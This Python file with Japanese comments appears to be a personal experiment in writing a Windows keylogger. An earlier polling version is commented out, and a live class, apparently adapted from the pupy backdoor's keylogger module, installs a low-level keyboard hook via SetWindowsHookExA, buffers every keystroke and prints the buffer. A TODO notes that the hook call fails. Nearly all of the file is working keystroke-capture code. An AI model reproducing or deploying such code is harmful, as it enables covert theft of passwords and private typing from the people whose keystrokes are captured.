#import threading, time
#from ctypes import *

#class Thread():
#    def __init__(self, addressOf, args):
#        self.terminate = False
#        self.Instance = threading.Thread(target=addressOf, args=args)
#        self.Instance.daemon = True
#        self.Instance.start()

#VKStr = {}
#VKStr[0x01] = "LEFT_MOUSEE"
#VKStr[0x02] = "RIGHT_MOUSE"
#VKStr[0x03] = "MIDDLE_MOUSE"
#VKStr[0x08] = "BACKSPACE"
#VKStr[0x09] = "TAB"
#VKStr[0x0D] = "ENTER"
#VKStr[0x10] = "SHIFT"
#VKStr[0x11] = "CTRL"
#VKStr[0x12] = "ALT"
#VKStr[0x14] = "CAPSLOCK"
#VKStr[0x18] = "ESCAPE"
#VKStr[0x20] = " "
#VKStr[0x25] = "LEFT_ARROW"
#VKStr[0x26] = "UP_ARROW"
#VKStr[0x27] = "RIGHT_ARROW"
#VKStr[0x28] = "DOWN_ARROW"
#VKStr[0x2C] = "PRINT_SCREEN"
#VKStr[0x30] = "0"
#VKStr[0x31] = "1"
#VKStr[0x32] = "2"
#VKStr[0x33] = "3"
#VKStr[0x34] = "4"
#VKStr[0x35] = "5"
#VKStr[0x36] = "6"
#VKStr[0x37] = "7"
#VKStr[0x38] = "8"
#VKStr[0x39] = "9"
#VKStr[0x41] = "a"
#VKStr[0x42] = "b"
#VKStr[0x43] = "c"
#VKStr[0x44] = "d"
#VKStr[0x45] = "e"
#VKStr[0x46] = "f"
#VKStr[0x47] = "g"
#VKStr[0x48] = "h"
#VKStr[0x49] = "i"
#VKStr[0x4A] = "j"
#VKStr[0x4B] = "k"
#VKStr[0x4C] = "l"
#VKStr[0x4D] = "m"
#VKStr[0x4E] = "n"
#VKStr[0x4F] = "o"
#VKStr[0x50] = "p"
#VKStr[0x51] = "q"
#VKStr[0x52] = "r"
#VKStr[0x53] = "s"
#VKStr[0x54] = "t"
#VKStr[0x55] = "u"
#VKStr[0x56] = "v"
#VKStr[0x57] = "w"
#VKStr[0x58] = "x"
#VKStr[0x59] = "y"
#VKStr[0x5A] = "z"

#ShiftEquivs={}
#ShiftEquivs[0x30] = ")"
#ShiftEquivs[0x31] = "!"
#ShiftEquivs[0x32] = "\""
#ShiftEquivs[0x33] = "£"
#ShiftEquivs[0x34] = "$"
#ShiftEquivs[0x35] = "%"
#ShiftEquivs[0x36] = "^"
#ShiftEquivs[0x37] = "&"
#ShiftEquivs[0x38] = "*"
#ShiftEquivs[0x39] = "("

#ActiveKeys = {}

#def StringToVK(string):
#    for key, value in VKStr.items():
#        if value == string:
#            return key


#def VKToString(VK):
#    return VKStr[VK]


#def IsKeyPressed( VK_KEYCODE ):

#    if( type(VK_KEYCODE) == str ):
#        try:
#            VK_KEYCODE = StringToVK( VK_KEYCODE )
#        except:
#            raise Exception("Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid")
#            return

#    return windll.user32.GetKeyState( c_int(VK_KEYCODE) ) & 0x8000 != 0# 最上位ビットが1の場合はキーが押されている



#def IsKeyToggled( VK_KEYCODE ):
#    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x0001 != 0# 最下位ビットが1の場合はキーがトグルされている



#class KeyTracker:

#    def __init__(self):
#        self.tracking = False
#        #self.tracked_string_concat = ""
#        self.file_open = False


#    def StartTracking(self):
#        self.tracking = True


#    def StopTracking(self):
#        self.tracking = False
#        #self.CompileData()


#    def KeyDown(self, key):

#        print( "KeyDown: ", VKToString(key) )

#        if( self.tracking and VKToString(key) != "SHIFT" ):

#            if( IsKeyToggled( StringToVK("CAPSLOCK") ) ):
#                pass
#                #self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
#            elif( IsKeyPressed( StringToVK("SHIFT") ) ):
#                shiftEquiv = False
#                try:
#                    ShiftEquivs[key]
#                    shiftEquiv = True
#                except:
#                    pass

#                if( shiftEquiv ):
#                    pass
#                    #self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key]
#                else:
#                    pass
#                    #self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
#            else:
#                pass
#                #self.tracked_string_concat = self.tracked_string_concat + VKToString(key)




#    def KeyUp( self, key ):

#        print( "KeyUp: ", VKToString(key)  )

#        if( self.tracking and VKToString(key) == "SHIFT" ):
#            #self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
#            pass


#    def UpdateKeyState( self, key, state ):

#        def SetKeyState( key, state ):
#            ActiveKeys[key] = state
#            if( state == True ):
#                self.KeyDown(key)
#            elif( state == False ):
#                self.KeyUp(key)

#        keyExists = False
#        try:
#            ActiveKeys[key]
#            keyExists = True
#        except:
#            pass

#        if( keyExists ):
#            if( ActiveKeys[key] != state ):
#                SetKeyState( key, state)
#        else:
#            SetKeyState( key, state )


#    #def CompileData(self):
#    #    try:
#    #        file = open("logger_data.txt", "a")
#    #        file.write("\n")
#    #        file.write("-"*15)
#    #        file.write("\n")
#    #        file.write(self.tracked_string_concat)
#    #        file.close()
#    #    except:
#    #        pass


#    def TrackData(self, time_length): #timeLength in seconds
#        KeyTracker.StartTracking()
#        #time.sleep(time_length)
#        #KeyTracker.StopTracking()



#if __name__=="__main__":

#    KeyTracker = KeyTracker()
#    t = Thread(KeyTracker.TrackData, [5])
#    while True:
#        for key, key_name in VKStr.items():
#            KeyTracker.UpdateKeyState( key, IsKeyPressed(key) )
#    print("end....")











# こういうのもある
# https://programtalk.com/vs4/python/7022/backdoorme/backdoors/shell/pupy/pupy/packages/windows/all/pupwinutils/keylogger.py/
# ループでキー全部チェックするのではなく、イベントフックでOSから発行されたキーイベントメッセージを受け取る

# マウスロガーは？


import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import threading
import time

user32 = windll.user32
kernel32 = windll.kernel32
WH_KEYBOARD_LL=13
WM_KEYDOWN=0x0100

keyCodes={
    0x08 : "[BKSP]",
    0x09 : "[TAB]",
    0x0D : "\n",
    0x10 : "[SHIFT]",
    0x11 : "[CTRL]",
    0x12 : "[ALT]",
    0x13 : "[PAUSE]",
    0x14 : "[CAPS_LOCK]",
    0x1B : "[ESCAPE]",
    0x20 : " ",
    0x25 : "[LEFT]",
    0x26 : "[UP]",
    0x27 : "[RIGHT]",
    0x28 : "[DOWN]",
    0x2C : "[PRINT_SCREEN]",
    0x2E : "[DEL]",
    0x90 : "[NUM_LOCk]",
    0xA0 : "[LSHIFT]",
    0xA1 : "[RSHIFT]",
    0xA2 : "[LCTRL]",
    0xA3 : "[RCTRL]",
    0xA4 : "[LMENU]",
    0xA5 : "[RMENU]",
}

class KeyLogger(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self, *args, **kwargs)
        self.hooked	 = None
        self.daemon=True
        self.keys_buffer=""
        self.lUser32=user32
        self.pointer=None
        self.stopped=False

    def run(self):
        if( self.install_hook() ):
            print( "keylogger installed")
        else:
            raise RuntimeError("couldn't install keylogger")
        msg = MSG()
        user32.GetMessageA(byref(msg),0,0,0)
        while not self.stopped:
            time.sleep(1)
        self.uninstall_hook()

    def stop(self):
        self.stopped=True

    def dump(self):
        res=self.keys_buffer
        self.keys_buffer=""
        return res

    def convert_key_code(self, code):
        #https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
        if code >=0x41 and code <=0x5a: # letters
            return chr(code)
        elif code>=0x30 and code <=0x39: # numbers
            return str(code-0x30)
        elif code>=0x60 and code <=0x69: # keypad numbers
            return str(code-0x60)
        elif code in keyCodes:
            return keyCodes[code]
        return "[%02x]"%code

    def install_hook( self ):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        self.pointer = CMPFUNC( self.hook_proc )
        self.hooked = self.lUser32.SetWindowsHookExA( WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0 )
        if not self.hooked:
            return False
        return True


    def uninstall_hook(self):												  
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


    def hook_proc( self, nCode, wParam, lParam ):
        if( wParam is not WM_KEYDOWN ):
            return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )
        hooked_key = self.convert_key_code( lParam[0] )
        self.keys_buffer+=hooked_key
        return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )




if __name__=="__main__":
    keyLogger = KeyLogger()
    keyLogger.start()
    while True:
        time.sleep(5)
        print( keyLogger.dump() )




# TODO:上のコードだと self.lUser32.SetWindowsHookExA で引っかかる. 下のやり方はどう?
# https://stackoverflow.com/questions/53732628/python-using-winapi-setwindowshookexa-on-windows-10
